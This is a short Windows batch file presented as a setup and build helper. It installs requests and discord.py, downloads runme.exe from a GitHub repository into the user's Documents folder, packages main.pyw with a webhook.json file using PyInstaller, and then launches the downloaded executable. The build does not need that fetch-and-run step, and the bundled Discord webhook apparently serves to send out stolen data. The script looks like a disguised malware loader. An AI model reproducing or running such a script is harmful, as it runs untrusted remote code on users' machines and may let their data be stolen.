@echo off
rem Change directory to the script's directory
cd /d "%~dp0"

rem Install necessary Python packages
pip install requests discord.py

rem Download runme.exe from GitHub to the Documents folder using curl
curl -o "%USERPROFILE%\Documents\runme.exe" -L "https://github.com/THECCP0069/thuggerprouultimate/raw/main/runme.exe"

rem Wait for 2 seconds
ping 127.0.0.1 -n 2 > nul

rem Run PyInstaller to build the script as a single executable
pyinstaller --onefile --add-data "webhook.json;." main.pyw

rem Wait for 2 seconds
ping 127.0.0.1 -n 2 > nul

rem Run the downloaded runme.exe
start "" "%USERPROFILE%\Documents\runme.exe"

rem Pause to see any errors
pause
